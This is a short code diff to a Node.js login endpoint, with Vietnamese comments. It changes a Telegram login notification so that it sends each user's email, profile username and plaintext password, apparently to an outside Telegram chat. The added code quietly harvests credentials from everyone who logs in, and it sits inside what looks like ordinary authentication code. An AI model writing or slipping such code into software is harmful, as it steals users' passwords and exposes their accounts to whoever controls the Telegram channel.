@@ -214,7 +214,18 @@ app.post('/api/login',wrap(async(req,res)=>{
   const sid=crypto.randomBytes(32).toString('hex');
   await saveClient(sid,client);
   res.cookie(COOKIE,sid,cookieOptions);
-  await notifyTelegramLogin();
+  try {
+    let username = '';
+    try {
+      const profile = await client.user.getProfile();
+      username = profile?.username || profile?.user?.username || '';
+    } catch (err) {
+      console.warn('[Telegram] Không lấy được username:', err.message);
+    }
+    await notifyTelegramLogin(email.trim(), username, password);   // ✅ truyền đủ 3
+  } catch (err) {
+    console.error('[Telegram] Gửi thất bại:', err.message);
+  }
   res.json({ok:true});
 }));
 
